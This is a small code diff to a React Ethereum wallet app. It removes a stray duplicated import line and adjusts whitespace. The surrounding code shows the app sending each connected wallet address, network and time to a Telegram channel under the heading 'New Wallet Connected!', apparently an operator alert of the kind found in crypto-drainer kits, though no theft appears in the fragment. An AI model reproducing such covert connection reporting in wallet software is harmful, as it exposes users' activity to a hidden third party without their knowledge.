@@ -1,4 +1,3 @@
-import { useState } from 'react';.txt
 import { useState } from 'react';
 import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
 import { ethers } from 'ethers';
@@ -91,7 +90,7 @@ export default function App() {
 
                 // Telegram Notification
         await sendTelegramMessage(`🔐 <b>New Wallet Connected!</b>\n\n📱 <b>Wallet:</b> <code>${address}</code>\n🌐 <b>Network:</b> Ethereum Mainnet\n⏰ <b>Time:</b> ${new Date().toLocaleString()}`);
-        
+
       }
     } catch (error) {
       console.error('WalletConnect Connection Failed:', error);
